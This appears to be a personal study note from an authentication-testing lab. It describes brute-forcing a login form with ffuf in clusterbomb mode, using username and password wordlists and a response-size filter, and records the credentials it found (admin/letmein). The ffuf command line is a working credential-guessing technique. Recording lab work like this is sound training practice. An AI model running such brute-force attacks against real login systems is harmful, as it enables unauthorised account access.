
![[Pasted image 20230717233011.png]]

this means the username was correct

![[Pasted image 20230717233149.png]]

content length is 3376 for incorrect request

![[Pasted image 20230717233545.png]]

mode clusterbomb:like cartesian product

```sh
ffuf -request authLab3req.txt -request-proto http -mode clusterbomb -w authLab3.txt:FUZZPASS -w /usr/share/seclists/SecLists-master/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3376 -o lab3auth.txt

```

request: the request header to send
request-proto:request protocol
-fs:filter size(remove response of specified size)
-o:output to file

![[Pasted image 20230717234904.png]]

user:admin
pass:letmein

can do same with clusterbomb attack in burp intruder